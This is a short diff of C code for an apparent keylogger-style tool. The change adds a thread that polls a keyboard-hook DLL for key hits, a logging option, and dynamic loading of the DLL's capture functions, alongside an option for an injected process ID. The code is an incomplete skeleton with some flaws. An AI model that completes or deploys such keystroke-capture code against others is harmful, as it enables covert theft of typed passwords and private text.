@@ -1,15 +1,35 @@
 #include "header.h"
 #include "getopt.h"
 #define KEYBOARD_HOOK_PATH "..\KeyBoardHook.dll" //If you want, change path.
+#define KEYBOARD_HOOK_NAME "KeyBoardHook.dll"
 #define MAX_FILE_NAME 260
+
+HMODULE dllModule = NULL;
+PFN_IS_NEW_KEY_HIT IsNewKeyHit= NULL;
+PFN_GET_KEYBOARD_VALUE GetKeyboardValue = NULL;
+BOOL opt_filesave = FALSE;
+char* log_file_name = "";
+
+DWORD WINAPI GetKeyBoardValueThreadFunc(LPVOID lpParam)
+{
+	while (1)
+	{
+		if (IsNewKeyHit)
+		{
+			if (opt_filesave)
+			{
+
+			}
+		}
+	}
+}
+
 int main(int argc, char* argv)
 {
 	const char* opt_pattern = "as:p:n:";
-	char* log_file_name = "";
 	int opt = 0;
 	DWORD injectedPID=0;
 	DWORD *pInjectedPID = &injectedPID;
-	BOOL opt_filesave = FALSE;
 
 	if (argc <= 1)
 	{
@@ -62,4 +82,8 @@ int main(int argc, char* argv)
 			break;
 		}
 	}
+
+	dllModule = LoadLibrary(KEYBOARD_HOOK_NAME);
+	IsNewKeyHit = (PFN_IS_NEW_KEY_HIT)GetProcAddress(dllModule, GET_KEYBOARD_EVENT_FUNC);
+	GetKeyboardValue = (PFN_GET_KEYBOARD_VALUE)GetProcAddress(dllModule, GET_KEYBOARD_VALUE_FUNC);
 }
